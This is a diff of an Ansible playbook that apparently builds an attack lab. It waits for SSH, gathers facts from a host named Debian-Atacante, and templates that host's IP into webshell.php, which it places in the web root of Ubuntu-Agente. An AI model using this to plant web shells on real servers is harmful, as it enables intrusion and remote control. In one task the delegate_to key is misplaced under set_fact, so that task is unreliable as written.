@@ -3,7 +3,14 @@
   hosts: Ubuntu-Agente
   gather_facts: false
   become: true
+  vars:
+    host_atacante: Debian-Atacante
   tasks:
+    - name: Esperar a que la conexión SSH esté disponible
+      wait_for_connection:
+        delay: 0
+        timeout: 60
+  
     - name: Hacer apt update
       apt:
         update_cache: true
@@ -24,9 +31,19 @@
         state: present
         install_recommends: false
 
-    - name: Copiar webshell.php a la máquina remota
-      copy:
-        src: ./scripts_ansible/webshell.php
+    - name: Recopilar datos de Debian-Atacante
+      setup:
+      delegate_to: "{{ host_atacante }}"
+      run_once: true
+
+    - name: Desplegar webshell.php
+      set_fact:
+        ip: "{{ hostvars[host_atacante].private_ip }}"
+        delegate_to: localhost
+
+    - name: Copy webshell.php to remote host
+      template:
+        src: ./scripts_ansible/templates/webshell.php.j2
         dest: /var/www/html/webshell.php
         owner: www-data
         group: www-data
